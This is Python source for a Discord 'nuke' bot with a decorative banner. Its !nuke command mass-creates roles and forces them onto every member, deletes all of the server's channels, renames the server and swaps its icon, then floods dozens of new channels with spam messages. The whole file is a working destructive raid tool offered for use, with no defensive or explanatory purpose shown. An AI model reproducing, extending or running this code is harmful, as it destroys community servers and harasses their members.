from colorama import Fore, init

init(autoreset=True)

def print_centered(text, color=Fore.MAGENTA, width=80):
    print(color + text.center(width))

print_centered("""
            ██████╗░███████╗░██████╗███╗░░░███╗░█████╗░██╗██████╗░░█████╗░██████╗░░█████╗░░██████╗██╗░░██╗
            ██╔══██╗██╔════╝██╔════╝████╗░████║██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║
            ██║░░██║█████╗░░╚█████╗░██╔████╔██║██║░░██║██║██████╔╝██║░░╚═╝██████╔╝███████║╚█████╗░███████║
            ██║░░██║██╔══╝░░░╚═══██╗██║╚██╔╝██║██║░░██║██║██╔══██╗██║░░██╗██╔══██╗██╔══██║░╚═══██╗██╔══██║
            ██████╔╝███████╗██████╔╝██║░╚═╝░██║╚█████╔╝██║██║░░██║╚█████╔╝██║░░██║██║░░██║██████╔╝██║░░██║
            ╚═════╝░╚══════╝╚═════╝░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝
""")
import discord
from discord.ext import commands
import asyncio
import requests
import json
from updater import update_packages
import aiohttp
import io

try:
    from discord.ext import commands
    import asyncio
    import requests
    import json
except ImportError:
    update_packages(["discord", "discord.ext", "asyncio", "requests", "json"])
1

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

with open('cfg/config.json') as config_file:
    config = json.load(config_file)

channels = []

@bot.command()
async def nuke(ctx):
    total_channels_to_create = config['total_channels_to_create']
    channels_to_delete_at_once = config['channels_to_delete_at_once'] 
    guild_name = config['guild_name']
    channel_name = config['channel_name']
    messages_to_send = config['messages_per_channel']
    message_content = config['message_content']
    guild_icon_url = config['guild_icon_url']
    total_roles_to_create = config['total_roles_to_create']
    role_name_base = config['role_name']
    created_roles = []
    for i in range(total_roles_to_create):
        role_name = f"{role_name_base}{i+1}"
        try:
            new_role = await ctx.guild.create_role(name=role_name)
            created_roles.append(new_role)
        except Exception as e:
            print(f"Error creating role: {role_name}, error: {str(e)}")

    print(f"New roles created in {ctx.guild}")

    for member in ctx.guild.members:
        if not member.bot:  #
            for role in created_roles:
                try:
                    await member.add_roles(role)
                except Exception as e:
                    print(f"Error assigning role: {role.name} to member: {member.name}, error: {str(e)}")
    print(f"All roles assigned to members in {ctx.guild}")
    async with aiohttp.ClientSession() as session:
        async with session.get(guild_icon_url) as resp:
            if resp.status != 200:
                return await ctx.send('Could not download file...')
            data = io.BytesIO(await resp.read())
    await ctx.guild.edit(icon=data.read())
    for i in range(0, len(ctx.guild.channels), channels_to_delete_at_once):  
        deletion_tasks = [channel.delete() for channel in ctx.guild.channels[i:i+channels_to_delete_at_once]] 
        await asyncio.gather(*deletion_tasks)
        print(f"Channels deleted in {ctx.guild}")
    print(f"All channels deleted in {ctx.guild}")
    await ctx.guild.edit(name=guild_name)
    print(f"Guild name changed to '{guild_name}' in {ctx.guild}")
    batch_size = 10  
    batch_count = total_channels_to_create // batch_size
    for _ in range(batch_count): 
        creation_tasks = [ctx.guild.create_text_channel(channel_name) for _ in range(batch_size)]  
        new_channels = await asyncio.gather(*creation_tasks)
        channels.extend(new_channels)
        for _ in range(messages_to_send):
            message_tasks = [channel.send(message_content) for channel in new_channels]
            await asyncio.gather(*message_tasks)
        await asyncio.sleep(0.1)

    print(f"New channels created and messages sent in {ctx.guild}")

@bot.event
async def on_ready():
    messages_to_send = config['messages_per_channel']
    message_content = config['message_content']
    for channel in channels:
        for _ in range(messages_to_send):
            await channel.send(message_content)

@bot.event
async def on_guild_join(guild):
    print(f"Bot joined new guild {guild}")
    bot_nickname = config['bot_nickname']
    await guild.me.edit(nick=bot_nickname)
    bot_avatar_url = config['bot_avatar_url']
    image_bytes = requests.get(bot_avatar_url).content
    await bot.user.edit(avatar=image_bytes)
    print(f"Bot avatar and nickname changed in guild {guild}")

bot_token = config['bot_token']
bot.run(bot_token)